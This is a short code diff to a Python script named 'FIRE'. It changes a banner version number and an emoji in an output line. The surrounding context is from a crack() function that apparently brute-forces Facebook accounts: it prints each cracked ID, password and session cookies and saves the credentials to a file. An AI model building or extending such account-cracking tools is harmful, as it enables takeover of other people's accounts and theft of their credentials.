@@ -183,7 +183,7 @@ def banner():
  Facebook  : RJ SHANTO
  Tool Name : FIRE
  Tool Type : \033[1;31mPRIVET\033[1;37m
- Version   : \033[1;32m2.5\033[1;37m
+ Version   : \033[1;32m0.1\033[1;37m
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
 def login():
 	banner()
@@ -498,7 +498,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#SHANTO-King
-				print(f'\r\033[0;92m[SHANTO-OK] {idf} 🖤 {pw}\n\033[0;93mCOOKIES 🐸 \033[0;92m{kuki} ')
+				print(f'\r\033[0;92m[SHANTO-OK] {idf} 🤍 {pw}\n\033[0;93mCOOKIES 🐸 \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
 				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
